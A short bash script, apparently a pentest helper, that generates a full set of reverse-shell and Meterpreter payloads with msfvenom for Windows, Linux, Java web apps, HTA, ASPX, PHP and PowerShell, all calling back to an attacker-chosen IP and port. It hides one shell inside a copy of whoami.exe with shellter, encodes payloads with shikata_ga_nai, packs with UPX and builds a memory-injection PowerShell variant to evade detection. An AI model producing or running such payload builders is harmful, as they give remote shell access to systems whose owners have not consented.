#!/bin/bash

[ ! -e $1 ] && IP=$1 || IP='tun0'
[ ! -e $2 ] && PORT=$2 || PORT=443



## Generate Windows Reverse Shell Payload
cp /usr/share/windows-resources/binaries/whoami.exe ./rsh.exe
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -e x86_shikata_ga_nai -i 15 -f raw > rsh443-win32.bin
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -e x86_shikata_ga_nai -i 15 -f raw > mrsh443-win32.bin
shellter -a -f rsh.exe -p rsh443-win32.bin
upx -9 rsh.exe
rm rsh443-win32.bin

## Generate Linux Reverse Shell Payload
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f elf > rsh443-x86.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f elf > rsh443-x64.elf
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PORT -f raw > rsh443.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PORT -f war > rsh443.war
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f hta-psh > rsh443.hta
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f aspx > rsh443.aspx
msfvenom -p php/reverse_php LHOST=$IP LPORT=$PORT -f raw > rsh443.php
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f powershell > rsh443.ps1
export TMP_PS1=`cat rsh443.ps1 | cut -d '=' -f 2 | sed 's| ||g'`; cat /opt/.Scripts/mem-inj.ps1 | sed "s|REGEN|$TMP_PS1|g" > meminj-rsh443.ps1
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f elf > mrsh443-x86.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f elf > mrsh443-x64.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f hta-psh > mrsh443.hta
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f aspx > mrsh443.aspx
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f powershell > mrsh443.ps1
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f powershell > mrsh443-x64.ps1
